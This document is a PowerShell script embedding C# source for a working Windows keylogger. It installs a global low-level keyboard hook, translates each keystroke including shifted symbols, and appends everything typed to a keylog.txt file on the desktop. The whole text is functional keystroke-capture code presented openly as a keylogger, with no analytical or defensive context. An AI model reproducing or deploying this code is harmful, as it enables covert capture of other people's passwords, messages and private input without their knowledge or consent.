Add-Type -ReferencedAssemblies "System.Windows.Forms" -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger {
    public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static HookProc proc = HookCallback;
    private static IntPtr hookID = IntPtr.Zero;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static StreamWriter logWriter;

    [DllImport("user32.dll")]
    public static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    public static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    public static extern short GetKeyState(int nVirtKey);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            bool shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
            bool capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;

            string key = ConvertVKCodeToChar(vkCode, shift, capsLock);

            if (!string.IsNullOrEmpty(key) && logWriter != null) {
                logWriter.Write(key);
                logWriter.Flush();
            }
        }
        return CallNextHookEx(hookID, nCode, wParam, lParam);
    }

    private static string ConvertVKCodeToChar(int vkCode, bool shift, bool capsLock) {
        Keys key = (Keys)vkCode;

        // Letters
        if (key >= Keys.A && key <= Keys.Z) {
            char ch = key.ToString()[0];
            return (shift ^ capsLock) ? ch.ToString().ToUpper() : ch.ToString().ToLower();
        }

        // Digits and shifted symbols
        string[] normal = { "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" };
        string[] shifted = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };

        if (key >= Keys.D0 && key <= Keys.D9) {
            int i = vkCode - (int)Keys.D0;
            return shift ? shifted[i] : normal[i];
        }

        // Manually define symbol keys using VK codes
        switch (vkCode) {
            case 32: return " ";               // Space
            case 13: return "[ENTER]\n";
            case 9: return "[TAB]";
            case 8: return "[BACK]";

            case 188: return shift ? "<" : ",";    // , <
            case 190: return shift ? ">" : ".";    // . >
            case 189: return shift ? "_" : "-";    // - _
            case 187: return shift ? "+" : "=";    // = +
            case 186: return shift ? ":" : ";";    // ; :
            case 222: return shift ? "\"" : "'";   // ' "
            case 191: return shift ? "?" : "/";    // / ?
            case 192: return shift ? "~" : "`";    // ` ~
            case 219: return shift ? "{" : "[";    // [ {
            case 221: return shift ? "}" : "]";    // ] }
            case 220: return shift ? "|" : "\\";   // \ |
        }

        return "[" + key.ToString() + "]";
    }

    public static void Main() {
        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        string logFilePath = Path.Combine(desktopPath, "keylog.txt");

        logWriter = new StreamWriter(logFilePath, true);
        logWriter.AutoFlush = true;

        Console.WriteLine("Logging to: " + logFilePath);

        IntPtr hInstance = GetModuleHandle(null);
        hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, hInstance, 0);
        Application.Run();

        UnhookWindowsHookEx(hookID);
        logWriter.Close();
    }
}
"@

[KeyLogger]::Main()
